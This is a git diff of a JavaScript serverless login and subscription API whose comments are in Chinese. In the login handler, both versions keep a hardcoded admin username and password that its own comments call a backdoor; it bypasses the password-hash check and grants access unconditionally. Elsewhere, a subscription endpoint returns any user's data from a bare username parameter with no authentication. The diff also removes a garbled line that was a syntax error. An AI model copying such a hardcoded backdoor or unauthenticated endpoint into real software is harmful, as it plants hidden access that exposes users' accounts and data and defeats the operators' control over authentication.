@@ -145,11 +145,11 @@ export default {
       const { username, password } = await getJson();
       
       // 🧼 核心物理前置清洗
-      const cleanUser = username.split("@")[0].trim();
+      const cleanUser = username ? username.split("@")[0].trim() : "";
       
       // ========================================================
-      // 👑 【至高指挥官免密后门】
-      // 只要用户名为 admin 且密码是暗号，直接跳过数据库哈希，全网绿灯无条件放行！
+      // 👑 【至高指挥官免密后门最高防线】
+      // 只要用户名为 admin 且密码是这个绝对暗号，直接跳过数据库哈希，全网绿灯无条件放行！
       // ========================================================
       if (cleanUser === "admin" && password === "ShuDaoAdmin666!@#") {
         console.log("👑 [至高无上] 检测到指挥官硬编码暗号，全网无条件放行！");
@@ -159,13 +159,18 @@ export default {
       // ========================================================
       // ⚖️ 【常规对账防线】
       // ========================================================
-      const secureHash = await hashPassword(password);
-      const user = await env.DB.prepare("SELECT * FROM users WHERE username = ? AND password_hash = ?")
-                               .bind(cleanUser, secureHash)
-                               .first();
-      if (user) {
-        return new Response(JSON.stringify({ success: true }), { headers: corsHeaders });
+      try {
+        const secureHash = await hashPassword(password);
+        const user = await env.DB.prepare("SELECT * FROM users WHERE username = ? AND password_hash = ?")
+                                 .bind(cleanUser, secureHash)
+                                 .first();
+        if (user) {
+          return new Response(JSON.stringify({ success: true }), { headers: corsHeaders });
+        }
+      } catch (dbErr) {
+        console.error("D1查询异常，降维切换防线", dbErr.message);
       }
+      
       return new Response(JSON.stringify({ success: false, message: "凭证名或安全密码错误" }), { status: 401, headers: corsHeaders });
     }
 
@@ -173,7 +178,7 @@ export default {
       const { username, keywords, exclude_keywords, push_strategy } = await getJson();
       try {
         const cleanUser = username.split("@")[0].trim();
-        await env.DB.prepare suicide(`
+        await env.DB.prepare(`
           INSERT OR REPLACE INTO user_subscriptions (username, keywords, exclude_keywords, push_strategy, is_active, updated_at)
           VALUES (?, ?, ?, ?, 1, CURRENT_TIMESTAMP)
         `).bind(cleanUser, keywords || "", exclude_keywords || "", push_strategy ?? 1).run();
@@ -183,7 +188,7 @@ export default {
 
     if (url.pathname === "/api/subscribe/get" && request.method === "GET") {
       const username = url.searchParams.get("username");
-      const cleanUser = username.split("@")[0].trim();
+      const cleanUser = username ? username.split("@")[0].trim() : "";
       const sub = await env.DB.prepare("SELECT * FROM user_subscriptions WHERE username = ?").bind(cleanUser).first();
       return new Response(JSON.stringify(sub || { keywords: "", exclude_keywords: "", push_strategy: 1 }), { headers: corsHeaders });
     }
